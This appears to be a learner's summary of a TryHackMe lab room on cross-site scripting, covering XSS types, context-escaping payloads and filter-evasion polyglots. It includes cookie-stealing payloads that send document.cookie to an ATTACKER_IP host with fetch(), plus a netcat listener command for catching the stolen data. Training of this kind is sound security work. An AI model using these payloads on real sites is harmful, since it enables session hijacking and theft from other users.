
# Intro to Cross-Site Scripting – TryHackMe

## Overview
This room explores the fundamentals and exploitation techniques of Cross-Site Scripting (XSS), a common web vulnerability that allows attackers to inject and execute malicious JavaScript in users' browsers. The content includes different XSS types, payload crafting, evasion techniques, and hands-on labs.

## 🧩 Key Concepts Covered

### XSS Payloads and Intentions
- Payloads are JavaScript code executed in the target's browser.
- Common intentions include:
  - **Proof of Concept** – `alert('XSS')`
  - **Session Stealing** – Send cookies to attacker server using `fetch()`
  - **Keylogging** – Capture and exfiltrate keystrokes
  - **Business Logic Abuse** – Call internal JS functions like `user.changeEmail()`

### Reflected XSS
- Occurs when user input in URL or headers is reflected in the page without sanitization.
- Example: `/page?error=<script>alert('XSS')</script>`
- Must test query strings, URL paths, and headers.

### Stored XSS
- Payload is saved in a database and rendered to other users (e.g., blog comments).
- Impact: Persistent attack vector, session hijacking, phishing.
- Test areas where user input is saved and then rendered (comments, profiles, listings).

### DOM-Based XSS
- The JavaScript code on the page itself introduces the vulnerability.
- Common sources: `window.location`, `document.referrer`, `location.hash`.
- Requires inspecting the site’s JS code and how it handles user-controlled values.

### Blind XSS
- Payload triggers on another user’s browser (e.g., admin viewing a support ticket).
- Needs external callback (e.g., `fetch('http://attacker/cookie=' + btoa(document.cookie))`).
- Use XSS Hunter tools or `nc -nlvp PORT` to capture exfiltrated data.

### Payload Crafting Techniques
- Escape context: Close tags or break attributes.
- Examples:
  - Input field: `"><script>alert('XSS')</script>`
  - Textarea: `</textarea><script>alert('XSS')</script>`
  - Script block: `';alert('XSS');//`
  - Image onload: `/img.jpg" onload="alert('XSS')`
- Use polyglots to bypass filters (e.g., `<sscriptcript>` becomes `<script>` after stripping).

### Hands-On XSS Labs
- **Levels 1–6** demonstrate XSS injection in:
  - Plain HTML
  - Input/textarea fields
  - Script blocks
  - Filtered environments
  - Attribute-based vectors
- Final level uses a polyglot that works across all previous challenges.

### Real-World Blind XSS Exploitation
- Ticket creation feature reflects content into an admin panel.
- Injected payload with `fetch()` to exfiltrate cookies to listener.
- Listener set with: `nc -nlvp 9001`
- Example payload: `</textarea><script>fetch('http://ATTACKER_IP:9001?cookie=' + btoa(document.cookie));</script>`

## 💡 Takeaways
- XSS vulnerabilities allow powerful attacks like session hijacking, phishing, and unauthorized actions.
- Crafting payloads depends heavily on context (HTML, attributes, JS blocks).
- DOM-based and Blind XSS are harder to detect and require advanced techniques.
- Filter evasion and polyglots are essential for bypassing input sanitization.

## ✅ Status
Room completed.
